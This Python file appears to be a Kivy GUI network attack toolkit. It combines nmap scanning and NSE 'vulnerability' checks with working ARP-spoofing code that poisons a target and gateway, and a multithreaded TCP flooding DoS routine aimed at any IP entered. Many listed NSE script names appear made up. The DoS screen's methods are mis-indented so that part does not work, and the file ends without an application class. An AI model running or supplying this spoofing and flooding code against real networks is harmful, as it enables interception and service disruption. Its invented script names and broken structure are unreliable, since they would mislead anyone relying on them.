#!/usr/bin/env python3

import os
import sys
import time
import threading
import socket
import random
import queue
import ctypes
import platform
import nmap
from scapy.all import Ether, ARP, sendp, getmacbyip, conf
from kivy.core.image import Image as CoreImage
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.platypus import SimpleDocTemplate, Paragraph
from reportlab.lib.units import inch
import os
import datetime

# =============================
# ADMIN PRIVILEGE CHECK
# =============================
if os.name == "nt":
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("[-] Please run this script as administrator.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Unable to check admin privileges: {e}")
        sys.exit(1)
else:
    # For non-Windows systems, you could add further checks if needed
    print("[*] Non-Windows OS detected; skipping admin privilege check.")

# Configure Scapy for Windows (Npcap must be installed with WinPcap compatibility if needed)
conf.use_pcap = True

from kivy.app import App
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.textinput import TextInput
from kivy.uix.popup import Popup
from kivy.uix.image import Image
from kivy.uix.floatlayout import FloatLayout
from kivy.core.window import Window
from kivy.properties import BooleanProperty
from kivy.clock import Clock
from kivy.uix.gridlayout import GridLayout
from kivy.uix.scrollview import ScrollView
import threading


# =============================
# SCANNING FUNCTIONS
# =============================
def host_discovery_ui(network_range):
    result = "\n[*] Host Discovery (Ping Sweep) on network...\n"
    try:
        scanner = nmap.PortScanner()
        scanner.scan(hosts=network_range, arguments="-sn -Pn")
    except Exception as e:
        return f"[-] Error during host discovery: {e}"

    for host in scanner.all_hosts():
        result += (
            "-" * 60
            + f"\nIP Address: {host}\nHostname  : {scanner[host].hostname()}\nState     : {scanner[host].state()}\n"
        )
        result += (
            f"MAC       : {scanner[host]['addresses'].get('mac', 'Not available')}\n"
        )
    result += "\n[*] Host Discovery complete.\n"
    return result


import nmap


def validate_input(network_range):
    if not network_range or not isinstance(network_range, str):
        return False
    return True


def scan_all_devices_ui(network_range):
    result = "\n[*] Scanning all devices in the local network...\n"
    try:
        scanner = nmap.PortScanner()
        common_ports = "21,22,23,25,53,80,110,139,143,443,445,993,995,3306,3389"
        scanner.scan(hosts=network_range, arguments=f"-sV -p {common_ports} -Pn")
    except Exception as e:
        return f"[-] Error during scan: {e}"

    for host in scanner.all_hosts():
        result += (
            "-" * 60
            + f"\nHost: {host} ({scanner[host].hostname()})\nState: {scanner[host].state()}\n"
        )
        for proto in scanner[host].all_protocols():
            result += f"Protocol: {proto}\n"
            for port in sorted(scanner[host][proto].keys()):
                result += f"Port {port:>5} : {scanner[host][proto][port]['state']}\n"
    result += "\n[*] Scan all devices complete.\n"
    return result


def quick_scan_ui(target):
    result = f"\n[*] Quick scan on {target} (top 100 ports)...\n"
    try:
        scanner = nmap.PortScanner()
        scanner.scan(hosts=target, arguments="-sS -T4 -F -Pn")
    except Exception as e:
        return f"[-] Error during quick scan: {e}"

    for host in scanner.all_hosts():
        result += (
            "-" * 60
            + f"\nHost: {host} ({scanner[host].hostname()})\nState: {scanner[host].state()}\n"
        )
        for proto in scanner[host].all_protocols():
            result += f"Protocol: {proto}\n"
            for port in sorted(scanner[host][proto].keys()):
                result += f"Port {port:>5} : {scanner[host][proto][port]['state']}\n"
    result += "\n[*] Quick scan complete.\n"
    return result


def aggressive_scan_ui(target):
    common_ports = "21,22,23,25,53,80,110,139,143,443,445,993,995,3306,3389"
    result = f"\n[*] Aggressive scan on {target}...\n"
    try:
        scanner = nmap.PortScanner()
        scanner.scan(hosts=target, arguments=f"-A -T4 -p {common_ports} -Pn")
    except Exception as e:
        return f"[-] Error during aggressive scan: {e}"

    for host in scanner.all_hosts():
        result += (
            "-" * 60
            + f"\nHost: {host} ({scanner[host].hostname()})\nState: {scanner[host].state()}\n"
        )
        for proto in scanner[host].all_protocols():
            result += f"Protocol: {proto}\n"
            for port in sorted(scanner[host][proto].keys()):
                result += f"Port {port:>5} : {scanner[host][proto][port]['state']}\n"
    result += "\n[*] Aggressive scan complete.\n"
    return result


def full_scan_ui(target):
    result = f"\n[*] Full scan on {target} (all ports)...\n"
    try:
        scanner = nmap.PortScanner()
        scanner.scan(hosts=target, arguments="-A -p- -Pn")
    except Exception as e:
        return f"[-] Error during full scan: {e}"

    for host in scanner.all_hosts():
        result += (
            "-" * 60
            + f"\nHost: {host} ({scanner[host].hostname()})\nState: {scanner[host].state()}\n"
        )
        for proto in scanner[host].all_protocols():
            result += f"Protocol: {proto}\n"
            for port in sorted(scanner[host][proto].keys()):
                result += f"Port {port:>5} : {scanner[host][proto][port]['state']}\n"
    result += "\n[*] Full scan complete.\n"
    return result

PORT_MAP = {
    80: 'http',
    443: 'https',
    21: 'ftp',
    22: 'ssh',
    23: 'telnet',
    25: 'smtp',
    53: 'dns',
    139: 'smb',
    445: 'smb',
    3306: 'mysql',
    1433: 'mssql',
    3389: 'rdp',
    161: 'snmp',
    8080: 'http',
    8443: 'https'
}

vuln_checks = {
    "http": [
        "http-vuln-cve2017-5638", "http-vuln-cve2017-1000117", "http-shellshock",
        "http-vuln-cve2014-3704", "http-dombased-xss", "http-fileupload-exploiter",
        "http-slowloris", "http-sql-injection", "http-vuln-cve2013-7091",
        "http-vuln-cve2015-1635", "http-vuln-cve2021-41773", "http-vuln-cve2021-42013",
        "http-vuln-cve2020-13167", "http-vuln-cve2019-19781", "http-vuln-cve2018-7600",
        "http-vuln-cve2019-6340", "http-vuln-cve2020-3452", "http-vuln-cve2020-10199",
        "http-vuln-cve2020-10204", "http-vuln-cve2020-1938", "http-vuln-cve2019-0232",
        "http-vuln-cve2018-1000861", "http-vuln-cve2017-8917", "http-vuln-cve2015-1427",
        "http-vuln-cve2014-8877", "http-phpself-xss", "http-stored-xss", "http-csrf",
        "http-jsonp-detection", "http-open-redirect", "http-passwd",
        "http-phpmyadmin-dir-traversal", "http-wordpress-users", "http-git",
        "http-config-backup", "http-trace", "http-iis-webdav-vuln",
        "http-method-tamper", "http-put", "http-webdav-scan"
    ],
    "https": [
        "ssl-heartbleed", "ssl-poodle", "ssl-ccs-injection", "ssl-dh-params",
        "ssl-enum-ciphers", "ssl-cert-intaddr", "ssl-known-key", "sslv2-drown",
        "tls-ticketbleed", "tls-nextprotoneg", "ssl-date", "ssl-cert",
        "tls-alpn", "tls-fallback-scsv", "ssl-enum-ciphers", "ssl-cert-validity",
        "ssl-google-cert-catalog", "ssl-cert-chain", "ssl-ccs-injection",
        "ssl-bekms", "ssl-date", "ssl-dh-params"
    ],
    "ftp": [
        "ftp-vsftpd-backdoor", "ftp-anon", "ftp-proftpd-backdoor", "ftp-vuln-cve2010-4221",
        "ftp-bounce", "ftp-brute", "ftp-libopie", "ftp-vuln-cve2011-2523",
        "ftp-vuln-cve2011-3192", "ftp-vuln-cve2012-1823", "ftp-vuln-cve2013-6621",
        "ftp-vuln-cve2019-5736", "ftp-syst", "ftp-enum", "ftp-default",
        "ftp-vuln-cve2020-11898", "ftp-vuln-cve2020-9470", "ftp-vuln-cve2020-10342",
        "ftp-vuln-cve2020-11048", "ftp-vuln-cve2019-9670", "ftp-vuln-cve2019-5418",
        "ftp-vuln-cve2018-13379", "ftp-vuln-cve2018-10933", "ftp-vuln-cve2018-1000115",
        "ftp-vuln-cve2017-7269", "ftp-vuln-cve2017-5638", "ftp-vuln-cve2017-5461"
    ],
    "smb": [
        "smb-vuln-ms17-010", "smb-vuln-cve2009-3103", "smb-vuln-cve-2017-7494",
        "smb-double-pulsar-backdoor", "smb-vuln-ms08-067", "smb-enum-users",
        "smb-vuln-ms06-025", "smb-vuln-ms07-029", "smb-vuln-ms08-067",
        "smb-vuln-ms10-054", "smb-vuln-ms10-061", "smb-vuln-ms17-010",
        "smb-vuln-cve-2017-7494", "smb-vuln-cve2009-3103", "smb-enum-domains",
        "smb-enum-groups", "smb-enum-processes", "smb-enum-services",
        "smb-enum-sessions", "smb-enum-shares", "smb-enum-users", "smb-flood",
        "smb-ls", "smb-mbenum", "smb-os-discovery", "smb-print-text",
        "smb-protocols", "smb-psexec", "smb-security-mode",
        "smb-server-stats", "smb-system-info", "smb-vuln-conficker",
        "smb-vuln-cve2012-1182", "smb-vuln-ms06-025", "smb-vuln-ms07-029"
    ],
    "ssh": [
        "ssh-vuln-cve2018-10933", "ssh-auth-methods", "sshv1", "ssh-hostkey",
        "ssh-publickey-acceptance", "ssh-run", "ssh-brute", "ssh-enum-algos",
        "ssh-vuln-cve2020-14145", "ssh-vuln-cve2019-6111", "ssh-vuln-cve2019-6110",
        "ssh-vuln-cve2019-6109", "ssh-vuln-cve2018-15473", "ssh-vuln-cve2018-10933",
        "ssh-vuln-cve2017-15906", "ssh-vuln-cve2016-10708", "ssh-vuln-cve2016-10009",
        "ssh-vuln-cve2016-0777", "ssh-vuln-cve2015-5600", "ssh-vuln-cve2014-1692",
        "ssh-vuln-cve2012-0814", "ssh-vuln-cve2011-4327", "ssh-vuln-cve2008-5161",
        "ssh-vuln-cve2006-5794", "ssh-vuln-cve2006-4924", "ssh-vuln-cve2003-0693",
        "ssh-vuln-cve2003-0682"
    ],
    "rdp": [
        "rdp-vuln-ms12-020", "rdp-enum-encryption", "rdp-ntlm-info",
        "rdp-vuln-ms12-020", "rdp-vuln-cve2019-0708", "rdp-vuln-cve2020-0609",
        "rdp-vuln-cve2020-0610", "rdp-vuln-cve2019-1181", "rdp-vuln-cve2019-1182",
        "rdp-vuln-cve2019-1222", "rdp-vuln-cve2019-1226", "rdp-vuln-cve2018-0886",
        "rdp-vuln-cve2018-0802", "rdp-vuln-cve2017-0176", "rdp-vuln-cve2017-0189",
        "rdp-vuln-cve2016-0036", "rdp-vuln-cve2015-2373", "rdp-vuln-cve2014-6318",
        "rdp-vuln-cve2012-0002", "rdp-vuln-cve2011-1641", "rdp-vuln-cve2005-1794",
        "rdp-enum-encryption", "rdp-sec-check", "rdp-protocol-check", "rdp-nla-support"
    ],
    "snmp": [
        "snmp-brute", "snmp-info", "snmp-interfaces", "snmp-netstat",
        "snmp-processes", "snmp-sysdescr", "snmp-win32-services",
        "snmp-win32-shares", "snmp-win32-software", "snmp-win32-users",
        "snmp-vuln-cve2019-5618", "snmp-vuln-cve2018-15454", "snmp-vuln-cve2018-15455",
        "snmp-vuln-cve2018-15456", "snmp-vuln-cve2018-15457", "snmp-vuln-cve2018-15458",
        "snmp-vuln-cve2018-15459", "snmp-vuln-cve2018-15460", "snmp-vuln-cve2018-15461",
        "snmp-vuln-cve2018-15462"
    ]
}

def vulnerability_scan_ui(target):
    start_time = time.time()
    result = f"\n[*] Performing vulnerability assessment on {target}...\n"
    
    try:
        scanner = nmap.PortScanner()
        result += "[*] Running service detection...\n"
        scanner.scan(hosts=target, arguments="-sV -Pn")

        if not scanner.all_hosts():
            result += "[-] Target not responding\n"
            return result

        host = scanner.all_hosts()[0]
        open_ports = []
        for proto in scanner[host].all_protocols():
            for port in scanner[host][proto].keys():
                if scanner[host][proto][port]['state'] == 'open':
                    service = scanner[host][proto][port].get('name', 'unknown')
                    open_ports.append((port, proto, service))

        if not open_ports:
            result += "[+] No open ports found\n"
            return result

        result += f"[+] Found {len(open_ports)} open ports/services:\n"
        for port, proto, service in open_ports:
            result += f"  - Port {port}/{proto}: {service}\n"

        result += "\n[*] Running vulnerability checks...\n"

        vulnerabilities_found = False

        for port, proto, service in open_ports:
            # Determine service_key using PORT_MAP and fallback to service name
            service_key = PORT_MAP.get(port, service.split("-")[0].lower())
            
            if service_key in vuln_checks:
                result += f"\n[*] Scanning {service} on {port}/{proto}...\n"
                scripts = ",".join(vuln_checks[service_key])
                
                # Construct protocol-specific port argument (T: for TCP, U: for UDP)
                proto_prefix = 'T' if proto == 'tcp' else 'U'
                sub_scanner = nmap.PortScanner()
                sub_scanner.scan(
                    hosts=target,
                    arguments=f"-p {proto_prefix}:{port} --script={scripts} -Pn"
                )

                # Access results using the correct protocol
                try:
                    for script in vuln_checks[service_key]:
                        try:
                            output = sub_scanner[host][proto][port]['script'][script]
                            if "VULNERABLE" in output.upper():
                                result += f"[!] VULNERABLE: {script}\n    {output}\n"
                                vulnerabilities_found = True
                            else:
                                result += f"[+] {script}: Clean\n"
                        except KeyError:
                            result += f"[+] {script}: No output\n"
                except KeyError:
                    result += "[+] No vulnerabilities found for this service\n"

        if vulnerabilities_found:
            result += "\n[!] Critical vulnerabilities detected!\n"
        else:
            result += "\n[+] No vulnerabilities found\n"

    except Exception as e:
        result += f"\n[-] Error: {e}\n"

    result += f"\n[*] Scan completed in {time.time() - start_time:.2f} seconds\n"
    return result

# =============================
# ARP SPOOFING FUNCTION
# =============================
def arp_spoofing(target_ip, gateway_ip, interval=0.5, stop_event=None, log_queue=None):
    """
    ARP Spoofing function with enhanced logging
    """
    try:
        # Resolve MAC addresses
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)

        if not target_mac or not gateway_mac:
            log_queue.put(f"[-] Failed to resolve MAC addresses for {target_ip} or {gateway_ip}")
            return

        log_queue.put(f"[+] Resolved Target MAC: {target_mac} | Gateway MAC: {gateway_mac}")

        # Build spoofed ARP packets
        pkt_to_target = Ether(dst=target_mac) / ARP(
            op=2,  # ARP reply
            pdst=target_ip,
            hwdst=target_mac,
            psrc=gateway_ip,
            hwsrc=gateway_mac,
        )

        pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
            op=2,  # ARP reply
            pdst=gateway_ip,
            hwdst=gateway_mac,
            psrc=target_ip,
            hwsrc=target_mac,
        )

        total_packets_sent = 0

        # Main spoofing loop
        while not stop_event.is_set():
            sendp(pkt_to_target, verbose=False)
            sendp(pkt_to_gateway, verbose=False)
            
            total_packets_sent += 2
            log_queue.put(f"[+] Sent ARP spoof to {target_ip} and {gateway_ip} (Total: {total_packets_sent})")
            
            # Sleep with periodic checks for stop_event
            elapsed = 0.0
            while elapsed < interval and not stop_event.is_set():
                time.sleep(0.1)
                elapsed += 0.1

    except Exception as e:
        log_queue.put(f"[-] Error in ARP spoofing: {str(e)}")
    finally:
        # Clean exit message
        log_queue.put("[*] ARP spoofing thread exited")

# =============================
# DOS ATTACK FUNCTIONS
# =============================
def start_dos_attack(target, port, num_threads, stop_event, dos_screen):
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=dos_attack_worker, args=(target, port, stop_event, dos_screen))
        t.daemon = True
        t.start()
        threads.append(t)

def dos_attack_worker(target, port, stop_event, dos_screen):
    while not stop_event.is_set():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((target, port))
                s.sendall(str(random.randint(1000, 9999)).encode())
                dos_screen.packet_counter[0] += 1
        except:
            pass

# =============================
# KIVY SCREENS
# =============================


# Hover behavior mixin
class HoverBehavior(object):
    hovered = BooleanProperty(False)

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        Window.bind(mouse_pos=self.on_mouse_pos)

    def on_mouse_pos(self, *args):
        if not self.get_root_window():
            return
        pos = args[1]
        inside = self.collide_point(*self.to_widget(*pos))
        self.hovered = inside
        self.on_hover(inside)

    def on_hover(self, *args):
        pass


# Stylish button with hover effect
class GlassButton(Button, HoverBehavior):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.background_normal = ""
        self.background_color = (1, 1, 1, 0.1)  # Semi-transparent
        self.color = (1, 1, 1, 1)
        self.bold = True
        self.font_size = 20
        self.padding = (10, 10)
        self.border = (16, 16, 16, 16)
        self.hovered = False

    def on_hover(self, hovered):
        if hovered:
            self.background_color = (1, 1, 1, 0.25)
        else:
            self.background_color = (1, 1, 1, 0.1)


class MainScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

        layout = FloatLayout()

        # Background image (modern approach)
        bg = Image(
            source="assets/bg.jpg",
            fit_mode="cover",
            size_hint=(1, 1),
            pos_hint={"x": 0, "y": 0},
        )
        layout.add_widget(bg)
        
        # Logo at top left
        logo = Image(
            source="assets/logo.png",
            size_hint=(0.15, 0.15),
            pos_hint={"x": 0.02, "y": 0.83},
        )
        layout.add_widget(logo)

        # Central content area (glass-like look)
        content = BoxLayout(
            orientation="vertical",
            size_hint=(0.5, 0.8),
            pos_hint={"center_x": 0.5, "center_y": 0.5},
            spacing=15,
            padding=20,
        )

        # Title label
        title = Label(
            text="Automated Network Penetration Testing Toolkit",
            font_size=29,
            bold=True,
            color=(1, 1, 1, 1),
            size_hint=(1, 0.2),
        )
        content.add_widget(title)

        # Buttons
        for text, name in [
            ("Scanning and Vulnerability Scannig", "scanning"),
            ("ARP Spoofing", "arp"),
            ("DoS Attack", "dos"),
            ("DDoS Attack", "ddos"),
            ("Exit", "exit"),
        ]:
            btn = GlassButton(text=text, size_hint=(1, 0.15))
            if name == "exit":
                btn.bind(on_press=lambda x: App.get_running_app().stop())
            else:
                btn.bind(on_press=lambda x, n=name: setattr(self.manager, "current", n))
            content.add_widget(btn)

        layout.add_widget(content)
        self.add_widget(layout)


class ScanningScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

        self.stop_event = threading.Event()
        layout = FloatLayout()

        # Background
        bg = Image(
            source="assets/bg.jpg",
            fit_mode="cover",
            size_hint=(1, 1),
            pos_hint={"x": 0, "y": 0},
        )
        layout.add_widget(bg)

        # Glass content box
        content = BoxLayout(
            orientation="vertical",
            size_hint=(0.8, 0.95),  # slightly bigger for better fit
            pos_hint={"center_x": 0.5, "center_y": 0.5},
            spacing=15,
            padding=20,
        )

        # Output text field
        self.info = TextInput(
            text="Output...",
            readonly=True,
            size_hint=(1, 0.4),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )
        content.add_widget(self.info)

        # Input field
        self.input_field = TextInput(
            hint_text="Enter network range or IP",
            size_hint=(1, 0.08),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )
        content.add_widget(self.input_field)

        # Button Grid
        button_layout = GridLayout(cols=1, spacing=15, size_hint=(1, None))
        button_layout.bind(minimum_height=button_layout.setter("height"))

        buttons = [
            ("Host Discovery", host_discovery_ui),
            ("Scan All Devices", scan_all_devices_ui),
            ("Quick Scan", quick_scan_ui),
            ("Aggressive Scan", aggressive_scan_ui),
            ("Full Scan", full_scan_ui),
        ]

        for label, func in buttons:
            btn = GlassButton(text=label, size_hint=(1, None), height=50)
            btn.text_size = (None, None)  # let text wrap naturally
            btn.halign = "center"
            btn.valign = "middle"
            btn.bind(on_press=lambda inst, f=func: self.run_scan(f))
            button_layout.add_widget(btn)

        # Wrap the GridLayout in a scrollable container if buttons overflow
        scroll_container = ScrollView(size_hint=(1, 0.4))
        scroll_container.add_widget(button_layout)
        content.add_widget(scroll_container)

        # Row for Stop + Back buttons
        bottom_buttons = BoxLayout(
            orientation="horizontal", spacing=10, size_hint=(1, 0.1)
        )

        stop_btn = GlassButton(text="Stop Scan")
        stop_btn.color = (1, 0, 0, 1)
        stop_btn.bind(on_press=self.stop_scan)
        bottom_buttons.add_widget(stop_btn)
        
        export_btn = GlassButton(text="Export PDF")
        export_btn.bind(on_press=self.export_results)
        bottom_buttons.add_widget(export_btn)

        back = GlassButton(text="Back")
        back.bind(on_press=lambda x: setattr(self.manager, "current", "main"))
        bottom_buttons.add_widget(back)

        content.add_widget(bottom_buttons)

        layout.add_widget(content)
        self.add_widget(layout)

    def show_result_with_prompt(self, result, target):
        self.info.text = result

        popup_content = BoxLayout(orientation="vertical", spacing=10)
        popup_content.add_widget(Label(text="Run a basic vulnerability check?"))

        btn_layout = BoxLayout(spacing=5, size_hint=(1, 0.4))
        btn_yes = GlassButton(text="Yes")
        btn_no = GlassButton(text="No")
        btn_layout.add_widget(btn_yes)
        btn_layout.add_widget(btn_no)
        popup_content.add_widget(btn_layout)

        self.vuln_popup = Popup(
            title="Vulnerability Scan",
            content=popup_content,
            size_hint=(0.7, 0.4),
            auto_dismiss=False,
        )

        def on_yes(instance):
            self.vuln_popup.dismiss()
            self.progress_popup = Popup(
                title="Scanning...",
                content=Label(text="Running vulnerability scan\nPlease wait..."),
                size_hint=(0.7, 0.4),
            )
            self.progress_popup.open()

            def scan_thread():
                try:
                    vuln_result = vulnerability_scan_ui(target)
                    Clock.schedule_once(
                        lambda dt: self.update_vuln_results(vuln_result)
                    )
                except Exception as e:
                    Clock.schedule_once(
                        lambda dt: self.update_vuln_results(f"Scan failed: {e}")
                    )
                finally:
                    Clock.schedule_once(lambda dt: self.progress_popup.dismiss())

            threading.Thread(target=scan_thread, daemon=True).start()

        def on_no(instance):
            self.vuln_popup.dismiss()

        btn_yes.bind(on_press=on_yes)
        btn_no.bind(on_press=on_no)

        self.vuln_popup.open()

    def update_vuln_results(self, result):
        if hasattr(self, "info"):
            self.info.text += f"\n{result}"
        if hasattr(self, "progress_popup") and self.progress_popup:
            self.progress_popup.dismiss()

    def run_scan(self, scan_fn):
        target = self.input_field.text.strip()
        if not target:
            self.info.text += "\n[-] Please enter a valid network range or IP."
            return
        self.stop_event.clear()
        self.info.text = f"[*] Running {scan_fn.__name__} on {target}...\n"
        self.scan_thread = threading.Thread(target=self._worker, args=(scan_fn, target))
        self.scan_thread.start()

    def _worker(self, scan_fn, target):
        try:
            result = scan_fn(target)
        except Exception as e:
            result = f"[-] Scan error: {e}"
        Clock.schedule_once(lambda dt: self.show_result_with_prompt(result, target))

    def stop_scan(self, instance):
        self.stop_event.set()
        self.info.text += (
            "\n[*] Scan stop event triggered (scan may not cancel immediately)."
        )

    def export_results(self, instance):
        if hasattr(self, 'info') and self.info.text and self.info.text != "Output...":
            try:
                filename = export_to_pdf(self.info.text, "scanning")
                self.info.text += f"\n[+] Report exported to {filename}"
            except Exception as e:
                self.info.text += f"\n[-] Failed to export report: {e}"
        else:
            self.info.text += "\n[-] No results to export"


class ARPSpoofScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.log_queue = queue.Queue()  # Add this line

        # Spoofing control
        self.stop_event = threading.Event()
        self.thread = None

        Clock.schedule_interval(self.update_output, 0.5)

        layout = FloatLayout()

        # Background
        bg = Image(
            source="assets/bg.jpg",
            fit_mode="cover",
            size_hint=(1, 1),
            pos_hint={"x": 0, "y": 0},
        )
        layout.add_widget(bg)

        # Glass-style container
        content = BoxLayout(
            orientation="vertical",
            spacing=10,
            padding=20,
            size_hint=(0.6, 0.9),
            pos_hint={"center_x": 0.5, "center_y": 0.5},
        )

        # Output area
        self.info = TextInput(
            text="ARP Spoofing Output...",
            readonly=True,
            size_hint=(1, 0.3),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )
        content.add_widget(self.info)

        # IP & Interval Inputs
        self.target_input = TextInput(
            hint_text="Enter target IP",
            size_hint=(1, 0.1),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )

        self.gateway_input = TextInput(
            hint_text="Enter gateway IP",
            size_hint=(1, 0.1),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )

        self.interval_input = TextInput(
            hint_text="Interval (sec, default 0.5) (Optional)",
            size_hint=(1, 0.1),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )

        content.add_widget(self.target_input)
        content.add_widget(self.gateway_input)
        content.add_widget(self.interval_input)

        # Buttons
        btn_start = GlassButton(text="Start Spoofing", size_hint=(1, 0.1))
        btn_start.bind(on_press=self.start_spoof)
        content.add_widget(btn_start)

        btn_stop = GlassButton(text="Stop Spoofing", size_hint=(1, 0.1))
        btn_stop.color = (1, 0, 0, 1)
        btn_stop.bind(on_press=self.stop_spoof)
        content.add_widget(btn_stop)
        
        export_btn = GlassButton(text="Export PDF", size_hint=(1, 0.1))
        export_btn.bind(on_press=self.export_results)
        content.add_widget(export_btn)

        back = GlassButton(text="Back", size_hint=(1, 0.1))
        back.bind(on_press=lambda x: setattr(self.manager, "current", "main"))
        content.add_widget(back)

        layout.add_widget(content)
        self.add_widget(layout)

    def update_output(self, dt):
        """Update UI with new log messages"""
        while not self.log_queue.empty():
            message = self.log_queue.get()
            self.info.text += "\n" + message

        # # Spoofing control
        # self.stop_event = threading.Event()
        # self.thread = None

    def start_spoof(self, instance):
        target = self.target_input.text.strip()
        gateway = self.gateway_input.text.strip()

        try:
            interval = float(self.interval_input.text.strip())
        except ValueError:
            self.info.text += "\n[-] Invalid interval input; defaulting to 0.5 seconds."
            interval = 0.5

        if not target or not gateway:
            self.info.text += "\n[-] Both target IP and gateway IP are required."
            return

        if not self.is_valid_ip(target) or not self.is_valid_ip(gateway):
            self.info.text += "\n[-] Invalid IP address format."
            return

        if self.thread and self.thread.is_alive():
            self.info.text += "\n[!] ARP Spoofing already in progress."
            return

        self.stop_event.clear()  # Clear the existing event
        self.thread = threading.Thread(
            target=arp_spoofing, 
            args=(target, gateway, interval, self.stop_event, self.log_queue)
        )
        self.thread.daemon = True
        self.thread.start()
        self.info.text += f"\n[*] ARP Spoofing started on {target}... (Interval: {interval}s)"

    def stop_spoof(self, instance):
        self.stop_event.set()
        if self.thread:
            self.thread.join(timeout=5)
        self.info.text += "\n[*] ARP Spoofing stopped."

    def is_valid_ip(self, ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def export_results(self, instance):
        if hasattr(self, 'info') and self.info.text and self.info.text != "ARP Spoofing Output...":
            try:
                filename = export_to_pdf(self.info.text, "arp_spoofing")
                self.info.text += f"\n[+] Report exported to {filename}"
            except Exception as e:
                self.info.text += f"\n[-] Failed to export report: {e}"
        else:
            self.info.text += "\n[-] No results to export"


class DOSAttackScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.stop_event = threading.Event()
        self.packets_sent = 0
        self.update_event = None
        self.packet_counter = [0]

        layout = FloatLayout()

        # Background
        bg = Image(
            source="assets/bg.jpg",
            fit_mode="cover",
            size_hint=(1, 1),
            pos_hint={"x": 0, "y": 0},
        )
        layout.add_widget(bg)

        # Glass content container
        content = BoxLayout(
            orientation="vertical",
            spacing=10,
            padding=20,
            size_hint=(0.6, 0.9),
            pos_hint={"center_x": 0.5, "center_y": 0.5},
        )

        # Output field
        self.info = TextInput(
            text="DoS Output...",
            readonly=True,
            size_hint=(1, 0.4),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )
        content.add_widget(self.info)

        # Inputs
        self.target_input = TextInput(
            hint_text="Enter target IP",
            size_hint=(1, 0.1),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )

        self.port_input = TextInput(
            hint_text="Enter target port (default 80)",
            input_filter="int",
            size_hint=(1, 0.1),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )

        content.add_widget(self.target_input)
        content.add_widget(self.port_input)

        # Buttons
        start_btn = GlassButton(text="Start DoS Attack", size_hint=(1, 0.1))
        start_btn.bind(on_press=self.start_dos)
        content.add_widget(start_btn)

        stop_btn = GlassButton(text="Stop DoS Attack", size_hint=(1, 0.1))
        stop_btn.color = (1, 0, 0, 1)
        stop_btn.bind(on_press=self.stop_dos)
        content.add_widget(stop_btn)

        export_btn = GlassButton(text="Export PDF", size_hint=(1, 0.1))
        export_btn.bind(on_press=self.export_results)
        content.add_widget(export_btn)

        back_btn = GlassButton(text="Back", size_hint=(1, 0.1))
        back_btn.bind(on_press=lambda x: setattr(self.manager, "current", "main"))
        content.add_widget(back_btn)

        layout.add_widget(content)
        self.add_widget(layout)

def start_dos(self, instance):
    target = self.target_input.text.strip()
    try:
        port = int(self.port_input.text.strip())
    except ValueError:
        port = 80

    if not target:
        self.info.text += "\n[-] Target IP required."
        return

    self.packets_sent = 0
    self.stop_event.clear()

    self.update_event = Clock.schedule_interval(self.update_output, 1)

    threading.Thread(
        target=start_dos_attack,
        args=(target, port, 10, self.stop_event, self),  # Pass self here
        daemon=True,
    ).start()

    self.info.text = "[*] DoS attack started..."

    # def start_dos(self, instance):
    #     target = self.target_input.text.strip()
    #     try:
    #         port = int(self.port_input.text.strip())
    #     except ValueError:
    #         port = 80

    #     if not target:
    #         self.info.text += "\n[-] Target IP required."
    #         return

    #     self.packets_sent = 0
    #     self.stop_event.clear()

    #     self.update_event = Clock.schedule_interval(self.update_output, 1)

    #     threading.Thread(
    #         target=start_dos_attack,
    #         args=(target, port, 10, self.stop_event),
    #         daemon=True,
    #     ).start()

    #     self.info.text = "[*] DoS attack started..."

    def stop_dos(self, instance):
        self.stop_event.set()
        if self.update_event:
            Clock.unschedule(self.update_event)
        self.info.text += "\n[*] DoS attack stopped."

    def update_output(self, dt):
        self.info.text += f"\n[+] Performing Attack - Sending Packets : {self.packet_counter[0]}"

